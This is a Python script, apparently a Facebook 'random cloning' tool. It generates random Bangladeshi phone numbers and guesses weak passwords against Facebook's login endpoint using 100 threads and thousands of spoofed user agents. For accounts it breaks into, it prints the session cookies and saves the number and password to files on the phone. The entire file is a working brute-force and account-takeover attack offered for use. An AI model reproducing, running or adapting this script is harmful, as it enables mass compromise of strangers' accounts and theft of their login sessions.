import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for gx in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','9','10','11','12','13','14','15'])
	c='RMX2195 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	nihan=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(nihan)
for gx in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','9','10','11','12','13','14','15'])
	c='RMX2195 Build/QKQ1.200614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	nihan=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(nihan)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system("espeak \"Wall come To Nihan Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""
\t\033[38;5;46m╔══════════════════════════════════╗
\t\033[38;5;46m║\033[38;5;46m███╗░░██╗\33[38;5;196m██╗\033[34;1m██╗░░██╗\033[38;5;46m░█████╗\33[38;5;196m░███╗░░██╗
\t\033[38;5;46m║\033[38;5;46m████╗░██║\33[38;5;196m██║\033[34;1m██║░░██║\033[38;5;46m██╔══██╗\033[38;5;46m████╗░██║
\t\033[38;5;46m║\033[38;5;46m██╔██╗██║\33[38;5;196m██║\033[34;1m███████║\033[38;5;46m███████║\33[38;5;196m██╔██╗██║
\t\033[38;5;46m║\033[38;5;46m██║╚████║\33[38;5;196m██║\033[34;1m██╔══██║\033[38;5;46m██╔══██║\033[38;5;46m██║╚████║
\t\033[38;5;46m║\033[38;5;46m██║░╚███║\33[38;5;196m██║\033[34;1m██║░░██║\033[38;5;46m██║░░██║\33[38;5;196m██║░╚███║
\t\033[38;5;46m║\033[38;5;46m╚═╝░░╚══╝\33[38;5;196m╚═╝\033[34;1m╚═╝░░╚═╝\033[38;5;46m╚═╝░░╚═╝\033[38;5;46m╚═╝░░╚══╝
\t\033[38;5;46m║
\t\033[38;5;46m╚══════════════════════════════════╝
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗚𝗫\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]𝗚𝗫 𝗡𝗜𝗛𝗔𝗡\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]𝗧𝗢𝗠 𝗖𝗪\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]𝗚𝗫 𝗡𝗜𝗛𝗔𝗡\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+880198100555\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]𝗥𝟰𝗡𝗗𝗢𝗠-𝗖𝗟𝗢𝗡𝗜𝗡𝗚\33[38;5;196m     ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]𝗣𝗥𝗘𝗠𝗜𝗨𝗠-𝗩𝟲\33[38;5;196m         ┃
 \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('espeak \"Wall come To Nihan vai ar, Facebook,id \'''')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100055821998949&mibextid=ZbWKwL''')
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as Nihan:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY Nihan JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            Nihan.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sNihan\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
            'method': 'GET',
            'path': '/',
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"RMX2195"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[Nihan-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/Nihan-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Nihan-CP💔] {uid} • {ps}")
                open('/sdcard/Nihan-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()